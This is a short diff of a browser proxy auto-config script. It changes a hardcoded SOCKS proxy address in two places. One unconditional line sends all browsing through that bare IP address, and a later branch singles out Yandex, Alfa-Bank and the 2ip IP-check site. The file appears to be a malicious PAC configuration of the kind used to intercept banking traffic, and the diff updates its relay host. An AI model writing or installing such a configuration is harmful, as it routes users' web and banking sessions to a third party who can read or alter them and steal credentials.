@@ -1,6 +1,6 @@
 function FindProxyForURL(url, host)
 {
-    return "SOCKS 88.212.235.223:3180";
+    return "SOCKS 46.101.237.41:3180";
 
     url  = url.toLowerCase();
     host = host.toLowerCase();
@@ -24,7 +24,7 @@ function FindProxyForURL(url, host)
     isAlfaBank = dnsDomainIs(host, ".alfabank.ru");
 
     if (isYandex || isAlfaBank || is2ip) {
-        return "SOCKS 88.212.235.223:3180";
+        return "SOCKS 46.101.237.41:3180";
     }
 
     return "DIRECT";
